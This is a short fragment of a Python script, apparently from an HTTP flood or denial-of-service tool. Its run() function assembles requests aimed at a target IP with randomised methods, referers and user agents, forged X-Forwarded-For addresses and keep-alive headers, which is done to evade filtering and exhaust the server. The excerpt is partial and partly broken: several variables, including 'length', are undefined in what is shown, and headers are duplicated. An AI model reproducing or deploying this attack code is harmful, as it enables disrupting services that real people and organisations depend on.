...
import random, socket, threading, ping3, sys
...
def run():
    get_host = ""+ random.choice(methhd) +" "+ ip +" HTTP/1.1\r\nHost: " + ip + "\r\n"
    referer = "Referer: " + random.choice(referers) + ip + "\r\n"
    accept = random.choice(acceptall)
    useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
    connection = "Connection: Keep-Alive\r\n"
    content = "Content-Type: application/x-www-form-urlencoded\r\n"
    forward   = "X-Forwarded-For: " + str(random.randint(1,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "\r\n"
    header = get_host + referer + forward + useragent + accept + content + connection +  length + "\r\n\r\n"
    request  = get_host + forward + connection + useragent + header + length + referer + content + accept + "\r\n"
